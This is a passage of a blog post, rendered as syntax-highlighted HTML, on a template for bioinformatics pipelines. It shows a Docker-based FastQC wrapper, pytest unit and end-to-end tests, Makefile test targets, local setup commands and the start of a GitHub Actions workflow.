style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">raise</span><span class="token plain"> ValueError</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"Expected '</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">expected_base2</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">', got '</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">base2</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">'"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">run_fastqc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Run FastQC on paired FASTQ files using Docker."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    validate_fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    cmd </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"run"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--rm"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"-v"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">f"</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">cwd</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">:</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">{</span><span class="token string-interpolation interpolation">cwd</span><span class="token string-interpolation interpolation punctuation" style="color:hsl(119, 34%, 47%)">}</span><span class="token string-interpolation string" style="color:hsl(119, 34%, 47%)">"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"biocontainers/fastqc:v0.11.9_cv8"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        </span><span class="token string" style="color:hsl(119, 34%, 47%)">"fastqc"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--outdir"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> output_dir</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">cmd</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> check</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token boolean" style="color:hsl(35, 99%, 36%)">True</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>Key patterns</strong>:</p>
<ul>
<li class="">✅ Validation before execution</li>
<li class="">✅ Docker isolation (reproducible)</li>
<li class="">✅ Clear function signatures</li>
<li class="">✅ Type hints for IDE support</li>
</ul>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="testing-strategy-unit--e2e">Testing Strategy: Unit + E2E<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#testing-strategy-unit--e2e" class="hash-link" aria-label="Direct link to Testing Strategy: Unit + E2E" title="Direct link to Testing Strategy: Unit + E2E" translate="no">​</a></h3>
<p><strong>apps/fastqc/tests/test_fastq_in_pairs.py</strong> (Unit tests)</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_validate_fastq_files_valid_pair</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test that valid paired files pass validation."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastq1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"/path/sample_R1_001.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastq2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"/path/sample_R2_001.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    validate_fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain">  </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Should not raise</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_validate_fastq_files_invalid_pair</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test that mismatched files raise error."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastq1 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"/path/sample_R1_001.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastq2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"/path/sample_R3_001.fastq.gz"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">with</span><span class="token plain"> pytest</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">raises</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">ValueError</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">        validate_fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><br></span></code></pre></div></div>
<p><strong>apps/fastqc/tests/test_e2e.py</strong> (End-to-end tests)</p>
<div class="language-python codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-python codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@pytest</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">fixture</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">dummy_fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Create minimal FASTQ files for testing."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">write_text</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"@SEQ_ID\nGATTT...\n+\nIIIII...\n"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">write_text</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token string" style="color:hsl(119, 34%, 47%)">"@SEQ_ID\nGATTT...\n+\nIIIII...\n"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">return</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">@pytest</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">mark</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token decorator annotation punctuation" style="color:hsl(119, 34%, 47%)">skipif</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">not</span><span class="token plain"> subprocess</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">run</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">[</span><span class="token string" style="color:hsl(119, 34%, 47%)">"docker"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"--version"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">]</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">.</span><span class="token plain">returncode </span><span class="token operator" style="color:hsl(221, 87%, 60%)">==</span><span class="token plain"> </span><span class="token number" style="color:hsl(35, 99%, 36%)">0</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    reason</span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token string" style="color:hsl(119, 34%, 47%)">"Docker is not available"</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">def</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">test_run_fastqc_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">dummy_fastq_files</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> data_dir</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token triple-quoted-string string" style="color:hsl(119, 34%, 47%)">"""Test actual FastQC execution with real (dummy) data."""</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2 </span><span class="token operator" style="color:hsl(221, 87%, 60%)">=</span><span class="token plain"> dummy_fastq_files</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    run_fastqc</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">fastq1</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> fastq2</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">,</span><span class="token plain"> </span><span class="token builtin" style="color:hsl(119, 34%, 47%)">str</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">(</span><span class="token plain">data_dir </span><span class="token operator" style="color:hsl(221, 87%, 60%)">/</span><span class="token plain"> </span><span class="token string" style="color:hsl(119, 34%, 47%)">"results"</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Assert output files exist</span><br></span></code></pre></div></div>
<p><strong>Test classification</strong>:</p>
<ul>
<li class=""><strong>Unit tests</strong> (<code>test_fastq_in_pairs.py</code>): Always fast, no Docker needed</li>
<li class=""><strong>E2E tests</strong> (<code>test_e2e.py</code>): Slower, require Docker, test actual tools</li>
</ul>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-2-local-testing-workflow">Part 2: Local Testing Workflow<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#part-2-local-testing-workflow" class="hash-link" aria-label="Direct link to Part 2: Local Testing Workflow" title="Direct link to Part 2: Local Testing Workflow" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="quick-setup">Quick Setup<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#quick-setup" class="hash-link" aria-label="Direct link to Quick Setup" title="Direct link to Quick Setup" translate="no">​</a></h3>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Clone the template</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">git</span><span class="token plain"> clone git@github.com:riverxdata/bioinfor-wf-template.git my-pipeline</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token builtin class-name" style="color:hsl(35, 99%, 36%)">cd</span><span class="token plain"> my-pipeline</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Install dependencies</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pip </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-r</span><span class="token plain"> requirements.txt</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Run all tests locally</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pytest </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-v</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># Or with Pixi (recommended)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi global </span><span class="token function" style="color:hsl(221, 87%, 60%)">install</span><span class="token plain"> act</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">pixi run tests</span><br></span></code></pre></div></div>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="testing-commands-with-make">Testing Commands with Make<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#testing-commands-with-make" class="hash-link" aria-label="Direct link to Testing Commands with Make" title="Direct link to Testing Commands with Make" translate="no">​</a></h3>
<p>Each app and workflow has a Makefile for consistent commands:</p>
<p><strong>apps/fastqc/Makefile</strong></p>
<div class="language-makefile codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-makefile codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">.PHONY: unittest e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">unittest:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	pytest -v -k "not e2e" tests/</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">e2e:</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">	pytest -v -k "e2e" tests/</span><br></span></code></pre></div></div>
<p><strong>Run tests locally:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># Unit tests only (fast - 10 seconds)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> apps/fastqc unittest</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># End-to-end tests (slower - 2 minutes)</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> apps/fastqc e2e</span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># All tests</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> apps/fastqc unittest e2e</span><br></span></code></pre></div></div>
<p><strong>Run tests for entire workflows:</strong></p>
<div class="language-bash codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-bash codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token comment" style="color:hsl(230, 4%, 64%)"># All unit tests in all apps</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">app</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> apps/*</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$app</span><span class="token plain"> unittest</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain" style="display:inline-block"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token comment" style="color:hsl(230, 4%, 64%)"># All E2E tests in all workflows</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain"></span><span class="token keyword" style="color:hsl(301, 63%, 40%)">for</span><span class="token plain"> </span><span class="token for-or-select variable" style="color:hsl(221, 87%, 60%)">workflow</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">in</span><span class="token plain"> workflows/*</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">do</span><span class="token plain"> </span><span class="token function" style="color:hsl(221, 87%, 60%)">make</span><span class="token plain"> </span><span class="token parameter variable" style="color:hsl(221, 87%, 60%)">-C</span><span class="token plain"> </span><span class="token variable" style="color:hsl(221, 87%, 60%)">$workflow</span><span class="token plain"> e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">;</span><span class="token plain"> </span><span class="token keyword" style="color:hsl(301, 63%, 40%)">done</span><br></span></code></pre></div></div>
<hr>
<h2 class="anchor anchorTargetStickyNavbar_Vzrq" id="part-3-smart-cicd-with-github-actions">Part 3: Smart CI/CD with GitHub Actions<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#part-3-smart-cicd-with-github-actions" class="hash-link" aria-label="Direct link to Part 3: Smart CI/CD with GitHub Actions" title="Direct link to Part 3: Smart CI/CD with GitHub Actions" translate="no">​</a></h2>
<h3 class="anchor anchorTargetStickyNavbar_Vzrq" id="github-actions-workflow-analysis">GitHub Actions Workflow Analysis<a href="https://riverxdata.github.io/river-docs/blog/bioinformatics-workflow-template-ci-cd-best-practices#github-actions-workflow-analysis" class="hash-link" aria-label="Direct link to GitHub Actions Workflow Analysis" title="Direct link to GitHub Actions Workflow Analysis" translate="no">​</a></h3>
<p><strong><code>.github/workflows/tests.yaml</code></strong> intelligently runs tests only for changed files:</p>
<div class="language-yaml codeBlockContainer_Ckt0 theme-code-block" style="--prism-background-color:hsl(230, 1%, 98%);--prism-color:hsl(230, 8%, 24%)"><div class="codeBlockContent_QJqH"><pre tabindex="0" class="prism-code language-yaml codeBlock_bY9V thin-scrollbar" style="background-color:hsl(230, 1%, 98%);color:hsl(230, 8%, 24%)"><code class="codeBlockLines_e6Vv"><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token key atrule" style="color:hsl(35, 99%, 36%)">jobs</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">  </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">unittest_and_e2e</span><span class="token punctuation" style="color:hsl(119, 34%, 47%)">:</span><span class="token plain"></span><br></span><span class="token-line" style="color:hsl(230, 8%, 24%)"><span class="token plain">    </span><span class="token key atrule" style="color:hsl(35, 99%, 36%)">runs-on</span><span class="token punctuation" 